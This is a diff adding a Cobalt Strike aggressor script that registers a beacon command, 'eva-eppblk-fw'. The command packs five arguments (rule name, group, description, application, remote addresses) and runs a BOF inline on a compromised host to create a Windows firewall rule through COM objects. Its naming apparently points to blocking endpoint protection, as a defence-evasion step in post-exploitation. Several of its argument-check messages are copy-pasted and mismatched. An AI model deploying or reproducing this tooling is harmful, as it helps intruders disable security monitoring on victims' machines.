@@ -1,0 +1,49 @@
+# author @mooolight
+
+beacon_command_register(
+	"eva-eppblk-fw", "Adding firewall rule via COM objects.",
+	"INFO:\n<description-2>.\n\n" .
+	"ARGUMENTS:\n[<ruleName>]: .\n[<ruleGroup>]: .\n[<ruleDescription>]: .\n[<ruleApplication>]: .\n[<ruleRuleRemoteAddrs>]: .\n\n\n" .
+	"USAGE:\neva-eppblk-fw "<ruleName> <ruleGroup> <ruleDescription> <ruleApplication> <ruleRuleRemoteAddrs>"\n\n" .
+	"EXAMPLES:\neva-eppblk-fw \n\n");
+
+alias eva-eppblk-fw {
+    $bid = $1;
+    $ruleName = $2;
+	$ruleGroup = $3;
+	$ruleDescription = $4;	
+	$ruleApplication = $5;
+	$ruleRuleRemoteAddrs = $6;
+
+    if ($ruleName eq "") {
+        berror($bid, "Please specify the rule name to call the firewall rule to be created.\n");
+        return;
+    }
+	if ($ruleGroup eq "") {
+        berror($bid, "Please specify file path to execute with Local Admin privilege.\n");
+        return;
+    }
+	if ($ruleDescription eq "") {
+        berror($bid, "Please specify file path to execute with Local Admin privilege.\n");
+        return;
+    }
+	if ($ruleApplication eq "") {
+        berror($bid, "Please specify file path to execute with Local Admin privilege.\n");
+        return;
+    }
+	if ($ruleRuleRemoteAddrs eq "") {
+        berror($bid, "Please specify file path to execute with Local Admin privilege.\n");
+        return;
+    }
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("eva-eppblk-fw-bof.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "zzzzz", $ruleName, $ruleGroup, $ruleDescription, $ruleApplication, $ruleRuleRemoteAddrs);
+
+    blog($bid, ".");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
